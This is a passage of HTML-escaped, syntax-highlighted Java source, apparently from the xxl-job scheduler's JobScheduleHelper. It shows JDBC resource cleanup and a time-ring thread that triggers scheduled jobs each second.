class=&quot;o&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setAutoCommit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connAutoCommit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SQLException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SQLException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// close PreparedStatement&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preparedStatement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;preparedStatement&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;SQLException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Wait seconds, align second&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// scan-overtime, not wait&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// pre-read period: success &amp;gt; scan each second; fail &amp;gt; skip this period;&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;MILLISECONDS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;preReadSuc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;PRE_READ_MS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scheduleThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, JobScheduleHelper#scheduleThread stop&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setDaemon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xxl-job, admin JobScheduleHelper#scheduleThread&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scheduleThread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ring thread&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringThread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// align second&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;MILLISECONDS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// second data&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringItemData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ArrayList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;();&lt;/span&gt;   &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nowSecond&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Calendar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Calendar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SECOND&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 避免处理耗时太长，跨过刻度，向前校验一个刻度；&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmpData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nowSecond&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmpData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;ringItemData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addAll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmpData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// ring trigger&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, time-ring beat : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nowSecond&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; = &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringItemData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringItemData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// do trigger&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;jobId:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ringItemData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// do trigger&lt;/span&gt;     &lt;span class=&quot;nc&quot;&gt;JobTriggerPoolHelper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jobId&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TriggerTypeEnum&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CRON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// clear&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ringItemData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; xxl-job, JobScheduleHelper#ringThread error:{}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// next second, align second&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;nc&quot;&gt;TimeUnit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;MILLISECONDS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;currentTimeMillis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ringThreadToStop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;logger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span 